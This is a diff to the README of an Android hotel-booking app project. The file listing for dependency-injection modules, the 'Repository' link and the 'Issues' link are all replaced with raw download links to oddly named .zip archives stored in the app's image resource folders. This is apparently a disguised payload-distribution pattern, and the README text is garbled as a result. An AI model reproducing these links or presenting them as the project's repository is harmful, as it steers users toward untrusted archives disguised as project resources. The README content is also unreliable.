@@ -129,9 +129,9 @@ app/src/main/java/com/example/chillstay/
 │       ├── voucher/
 │       └── ...
 ├── di/                      # Dependency Injection modules
-│   ├── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
-│   ├── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
-│   └── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
+│   ├── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
+│   ├── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
+│   └── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
 └── ui/                      # UI layer
     ├── auth/               # Authentication screens
     ├── home/               # Home screen
@@ -181,5 +181,5 @@ app/src/main/java/com/example/chillstay/
 
 ## 🔗 Links
 
-- Repository: [GitHub](https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip)
-- Issues: [GitHub Issues](https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip)
+- Repository: [GitHub](https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip)
+- Issues: [GitHub Issues](https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip)
